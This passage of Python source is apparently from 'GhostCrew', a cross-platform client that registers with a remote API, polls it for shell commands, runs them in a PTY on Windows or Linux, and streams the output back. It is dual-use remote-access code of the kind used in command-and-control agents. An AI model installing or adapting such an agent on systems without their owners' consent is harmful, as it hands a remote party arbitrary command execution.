        if not pty_process:
            return ""
        
        complete_output = ""
        last_sent_length = 0
        last_send_time = time.time()
        send_interval = 2.0  # Send every 2 seconds
        chunk_sequence = 1
        
        print(f"Starting enhanced Windows output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                if pty_process.isalive():
                    data = pty_process.read(timeout=1000)  # Longer timeout
                    if data:
                        # Clean up data
                        import re
                        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
                        cleaned_data = ansi_escape.sub('', data)
                        cleaned_data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_data)
                        
                        if cleaned_data:  # Accept any cleaned data, even if just whitespace
                            complete_output += cleaned_data
                            self.latest_output = complete_output[-2000:]  # Keep last 2000 chars for detection
                            print(f"Added {len(cleaned_data)} chars, total: {len(complete_output)}")
                            self.last_output_time = time.time()
                else:
                    print("PTY process is no longer alive")
                    break
                
                # Send periodic updates with ONLY NEW content
                current_time = time.time()
                if current_time - last_send_time >= send_interval:
                    current_length = len(complete_output)
                    
                    if current_length > last_sent_length:
                        new_content = complete_output[last_sent_length:]
                        print(f"Sending NEW content: {len(new_content)} chars (total: {current_length})")
                        
                        success = self.stream_output_update(
                            command_id, 
                            new_content,
                            session_id, 
                            True, 
                            chunk_sequence
                        )
                        
                        if success:
                            last_sent_length = current_length
                            chunk_sequence += 1
                        
                    last_send_time = current_time
                
            except Exception as e:
                print(f"Error in enhanced Windows output reading: {e}")
                break
        
        # Send final new content if any
        final_length = len(complete_output)
        if final_length > last_sent_length:
            final_new_content = complete_output[last_sent_length:]
            print(f"Sending final NEW content: {len(final_new_content)} chars")
            self.stream_output_update(command_id, final_new_content, session_id, False, chunk_sequence)
        
        return complete_output

    def read_pty_output_linux_enhanced(self, master_fd, command_id, session_id):
        """Enhanced Linux PTY output reading with delayed completion detection"""
        complete_output = ""
        last_sent_length = 0
        last_send_time = time.time()
        send_interval = 2.0  # Send every 2 seconds
        chunk_sequence = 1
        
        print(f"Starting enhanced Linux output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                ready, _, _ = select.select([master_fd], [], [], 1.0)  # Longer timeout
                
                if ready:
                    try:
                        raw_data = os.read(master_fd, 4096)  # Larger buffer
                        data = None
                        
                        for encoding in ['utf-8', 'latin1', 'cp1252', 'ascii']:
                            try:
                                data = raw_data.decode(encoding)
                                break
                            except UnicodeDecodeError:
                                continue
                        
                        if data is None:
                            data = raw_data.decode('utf-8', errors='replace')
                        
                        if data:
                            import re
                            ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
                            cleaned_data = ansi_escape.sub('', data)
                            cleaned_data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_data)
                            
                            if cleaned_data:  # Accept any cleaned data
                                complete_output += cleaned_data
                                self.latest_output = complete_output[-2000:]  # Keep last 2000 chars for detection
                                print(f"Added {len(cleaned_data)} chars, total: {len(complete_output)}")
                                self.last_output_time = time.time()
                                
                    except OSError as e:
                        print(f"PTY read error: {e}")
                        break
                
                # Send periodic updates with ONLY NEW content
                current_time = time.time()
                if current_time - last_send_time >= send_interval:
                    current_length = len(complete_output)
                    
                    if current_length > last_sent_length:
                        new_content = complete_output[last_sent_length:]
                        print(f"Sending NEW content: {len(new_content)} chars (total: {current_length})")
                        
                        success = self.stream_output_update(
                            command_id, 
                            new_content,
                            session_id, 
                            True, 
                            chunk_sequence
                        )
                        
                        if success:
                            last_sent_length = current_length
                            chunk_sequence += 1
                        
                    last_send_time = current_time
                
                # Check for process completion
                if self.current_process and self.current_process.poll() is not None:
                    print(f"Process completed with exit code: {self.current_process.returncode}")
                    # Don't break immediately, let the output finish
                    time.sleep(2)  # Give time for final output
                    break
                
            except Exception as e:
                print(f"Error in enhanced Linux output reading: {e}")
                break
        
        # Send final new content if any
        final_length = len(complete_output)
        if final_length > last_sent_length:
            final_new_content = complete_output[last_sent_length:]
            print(f"Sending final NEW content: {len(final_new_content)} chars")
            self.stream_output_update(command_id, final_new_content, session_id, False, chunk_sequence)
        
        return complete_output
        
    def read_pty_output_windows_persistent(self, pty_process, command_id, session_id):
        """Persistent Windows PTY output reading - no timeouts"""
        if not pty_process:
            return ""
        
        complete_output = ""
        last_sent_length = 0
        last_send_time = time.time()
        send_interval = 2.0
        chunk_sequence = 1
        
        print(f"Starting PERSISTENT Windows output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                if pty_process.isalive():
                    data = pty_process.read(timeout=1000)
                    if data:
                        # Clean up data
                        import re
                        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
                        cleaned_data = ansi_escape.sub('', data)
                        cleaned_data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_data)
                        
                        if cleaned_data:
                            complete_output += cleaned_data
                            self.latest_output = complete_output[-2000:]
                            print(f"Added {len(cleaned_data)} chars, total: {len(complete_output)}")
                            self.last_output_time = time.time()
                else:
                    print("PTY process is no longer alive - ending output monitoring")
                    break
                
                # Send periodic updates with ONLY NEW content
                current_time = time.time()
                if current_time - last_send_time >= send_interval:
                    current_length = len(complete_output)
                    
                    if current_length > last_sent_length:
                        new_content = complete_output[last_sent_length:]
                        print(f"Sending NEW content: {len(new_content)} chars (total: {current_length})")
                        
                        success = self.stream_output_update(
                            command_id, 
                            new_content,
                            session_id, 
                            True, 
                            chunk_sequence
                        )
                        
                        if success:
                            last_sent_length = current_length
                            chunk_sequence += 1
                        
                    last_send_time = current_time
                
            except Exception as e:
                print(f"Error in persistent Windows output reading: {e}")
                break
        
        # Send final new content if any
        final_length = len(complete_output)
        if final_length > last_sent_length:
            final_new_content = complete_output[last_sent_length:]
            print(f"Sending final NEW content: {len(final_new_content)} chars")
            self.stream_output_update(command_id, final_new_content, session_id, False, chunk_sequence)
        
        print(f"Windows persistent output monitoring ended for command {command_id}")
        return complete_output

    def read_pty_output_linux_persistent(self, master_fd, command_id, session_id):
        """Persistent Linux PTY output reading - no timeouts"""
        complete_output = ""
        last_sent_length = 0
        last_send_time = time.time()
        send_interval = 2.0
        chunk_sequence = 1
        
        print(f"Starting PERSISTENT Linux output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                ready, _, _ = select.select([master_fd], [], [], 1.0)
                
                if ready:
                    try:
                        raw_data = os.read(master_fd, 4096)
                        data = None
                        
                        for encoding in ['utf-8', 'latin1', 'cp1252', 'ascii']:
                            try:
                                data = raw_data.decode(encoding)
                                break
                            except UnicodeDecodeError:
                                continue
                        
                        if data is None:
                            data = raw_data.decode('utf-8', errors='replace')
                        
                        if data:
                            import re
                            ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
                            cleaned_data = ansi_escape.sub('', data)
                            cleaned_data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_data)
                            
                            if cleaned_data:
                                complete_output += cleaned_data
                                self.latest_output = complete_output[-2000:]
                                print(f"Added {len(cleaned_data)} chars, total: {len(complete_output)}")
                                self.last_output_time = time.time()
                                
                    except OSError as e:
                        print(f"PTY read error: {e}")
                        break
                
                # Send periodic updates with ONLY NEW content
                current_time = time.time()
                if current_time - last_send_time >= send_interval:
                    current_length = len(complete_output)
                    
                    if current_length > last_sent_length:
                        new_content = complete_output[last_sent_length:]
                        print(f"Sending NEW content: {len(new_content)} chars (total: {current_length})")
                        
                        success = self.stream_output_update(
                            command_id, 
                            new_content,
                            session_id, 
                            True, 
                            chunk_sequence
                        )
                        
                        if success:
                            last_sent_length = current_length
                            chunk_sequence += 1
                        
                    last_send_time = current_time
                
                # Check if main process ended
                if self.current_process and self.current_process.poll() is not None:
                    print(f"Process completed with exit code: {self.current_process.returncode}")
                    # Give a moment for final output then break
                    time.sleep(1)
                    break
                
            except Exception as e:
                print(f"Error in persistent Linux output reading: {e}")
                break
        
        # Send final new content if any
        final_length = len(complete_output)
        if final_length > last_sent_length:
            final_new_content = complete_output[last_sent_length:]
            print(f"Sending final NEW content: {len(final_new_content)} chars")
            self.stream_output_update(command_id, final_new_content, session_id, False, chunk_sequence)
        
        print(f"Linux persistent output monitoring ended for command {command_id}")
        return complete_output

    def terminate_interactive_session(self, reason="user_request"):
        """Explicitly terminate the current interactive session"""
        if self.interactive_mode:
            print(f"Terminating interactive session: {reason}")
            self.interactive_mode = False
            
            # Send termination signal to current process if exists
            if hasattr(self, 'current_process') and self.current_process:
                try:
                    if self.current_process.poll() is None:
                        self.current_process.terminate()
                        time.sleep(1)
                        if self.current_process.poll() is None:
                            self.current_process.kill()
                except Exception as e:
                    print(f"Error terminating process: {e}")
            
            # Close PTY if exists
            if hasattr(self, 'current_pty_master'):
                try:
                    os.close(self.current_pty_master)
                except:
                    pass
            
            self.cleanup_process()

    def cleanup_process(self):
        """Clean up current process and PTY"""
        if self.current_process:
            try:
                if self.current_process.poll() is None:
                    self.current_process.terminate()
                    time.sleep(1)
                    if self.current_process.poll() is None:
                        self.current_process.kill()
            except:
                pass
            self.current_process = None
        
        # Platform-specific cleanup
        if not IS_WINDOWS:
            if self.current_pty_master:
                try:
                    os.close(self.current_pty_master)
                except:
                    pass
                self.current_pty_master = None
            
            if self.current_pty_slave:
                try:
                    os.close(self.current_pty_slave)
                except:
                    pass
                self.current_pty_slave = None
        
        self.interactive_mode = False
        self.current_command_id = None
    
    def execute_command(self, command_data):
        """Execute a command (interactive or simple)"""
        command = command_data['command']
        command_id = command_data['command_id']
        session_id = command_data.get('session_id', '')
        
        print(f"=== EXECUTING COMMAND ===")
        print(f"Command: {command}")
        print(f"Command ID: {command_id}")
        print(f"Session ID: {session_id}")
        print(f"Platform: {'Windows' if IS_WINDOWS else 'Linux'}")
        
        # Handle built-in commands
        if command.strip().lower() == 'exit':
            return "Goodbye!", 0, 0
        
        if command.strip().lower().startswith('cd '):
            return self.handle_cd_command(command.strip())
        
        # Determine execution method
        is_interactive = self.is_interactive_command(command)
        is_continuous = self.is_continuous_command(command)
        
        print(f"Interactive: {is_interactive}")
        print(f"Continuous: {is_continuous}")
        
        if is_interactive or is_continuous:
            print(">>> USING PTY EXECUTION <<<")
            output, exec_time, exit_code = self.execute_interactive_command(
                command, command_id, session_id
            )
        else:
            print(">>> USING SIMPLE EXECUTION <<<")
            output, exec_time, exit_code = self.execute_simple_command(command)
        
        print(f"=== COMMAND COMPLETED ===")
        print(f"Exit code: {exit_code}")
        print(f"Execution time: {exec_time}")
        print(f"Output length: {len(output) if output else 0}")
        
        return output, exec_time, exit_code
    
    def handle_cd_command(self, command):
        """Handle directory change commands"""
        try:
            parts = command.split(None, 1)
            if len(parts) < 2:
                # cd with no arguments
                if IS_WINDOWS:
                    target_dir = os.path.expanduser('~')  # User profile on Windows
                else:
                    target_dir = os.path.expanduser('~')  # Home directory on Linux
            else:
                target_dir = os.path.expanduser(parts[1])
            
            original_dir = self.working_directory
            os.chdir(target_dir)
            self.working_directory = os.getcwd()
            
            if self.working_directory != original_dir:
                return f"Changed directory to: {self.working_directory}", 0, 0
            else:
                return f"Already in directory: {self.working_directory}", 0, 0
                
        except Exception as e:
            return f"cd: {str(e)}", 0, 1
    
    def run(self):
        """Main client loop"""
        print(f"Starting GhostCrew client for host: {self.host_id}")
        print(f"Platform: {platform.system()} {platform.release()}")
        print(f"Python: {sys.version}")
        
        # Register host
        if not self.register_host():
            print("Failed to register host, exiting...")
            return
        
        last_ping = time.time()
        ping_interval = 30
        
        while self.running:
            try:
                # Send periodic ping
                current_time = time.time()
                if current_time - last_ping >= ping_interval:
                    if not self.interactive_mode:
                        if not self.ping_host():
                            print("Failed to ping server")
                        last_ping = current_time
                    else:
                        last_ping = current_time
                
                # Get and execute commands
                if not self.interactive_mode:
                    command_data = self.get_command()
                    if command_data:
                        self.session_id = command_data.get('session_id')
                        
                        # Execute the command
                        output, exec_time, exit_code = self.execute_command(command_data)
                        
                        # Submit result
                        success = self.submit_result(
                            command_data['command_id'],
                            output,
                            exec_time,
                            self.working_directory,
                            exit_code
                        )
                        
                        if success:
                            print(f"Result submitted successfully (exit code: {exit_code})")
                        else:
                            print("Failed to submit result")
                    else:
                        time.sleep(2)
                else:
                    time.sleep(1)
                
            except KeyboardInterrupt:
                print("\nReceived interrupt signal, shutting down...")
                break
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(5)
        
        self.cleanup_process()
        print("Client shutting down...")

def main():
    """Main entry point"""
    if len(sys.argv) < 3:
        print("Usage: python3 GhostCrew.py <api_url> <host_id> [instance_token]")
        print("Example: python3 GhostCrew.py http://192.168.1.171/GhostCrew/api.php my-host-123 inst_token_here")
        sys.exit(1)
    
    api_url = sys.argv[1]
    host_id = sys.argv[2]
    instance_token = sys.argv[3] if len(sys.argv) > 3 else None
    
    client = CrossPlatformCommandClient(host_id, api_url, instance_token)
    client.run()

if __name__ == "__main__":
    main()